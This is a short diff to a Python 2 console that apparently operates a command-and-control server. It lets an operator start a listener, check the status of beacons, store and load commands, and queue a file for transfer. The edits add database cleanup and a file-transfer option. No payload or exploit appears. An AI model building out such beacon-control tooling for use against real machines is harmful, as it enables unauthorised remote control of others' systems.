@@ -19,23 +19,23 @@ def start_prompt():
     loaded = ""
     s = server.Server(port)
     db = init_db()
-
+     
     while True:
         try:
             cmd = raw_input("[*] ")
         except (KeyboardInterrupt, SystemExit):
             print ""
+            db.close()
             sys.exit()
         
         cmd = cmd.split(" ")
         if len(cmd) == 1:
             if cmd[0] == "start":  # starting server
                 s = start_server(port)
-            elif cmd[0] == "exit":   # shutting server down
-                sys.exit()
             
-            elif cmd[0] == "load":  # load defined command into server
-                s.load_command(cmd[1], db)  # retrieve command from database
+            elif cmd[0] == "exit":   # shutting server down
+                db.close()
+                sys.exit()
             
             elif cmd[0] ==  "status":   # check the status of all the servers beacons
                 d = check_status(s)
@@ -44,7 +44,7 @@ def start_prompt():
                 print "=========================="
                 for key in d: print str(key) + "  | " + str(d[key])
 
-        elif len(cmd) == 2: 
+        elif len(cmd) >= 2: 
             if cmd[0] == "port":  # defining port to listen on
                 port = int(cmd[1])
 
@@ -52,7 +52,14 @@ def start_prompt():
                 name = cmd[0]
                 newCmd = ' '.join(cmd[2::]) # combine the rest of the array into single string
                 s.add_command(name, newCmd, db) # add command to database
-     
+            
+            elif cmd[0] == "load":  # load defined command into server
+                s.load_command(cmd[1], db)  # retrieve command from database
+            
+            elif cmd[0] == "file":  # load file to be transfered
+                s.f = True
+                s.fName = cmd[1]
+
 """
     Function to conenct to the servers sqlite3 backend
 
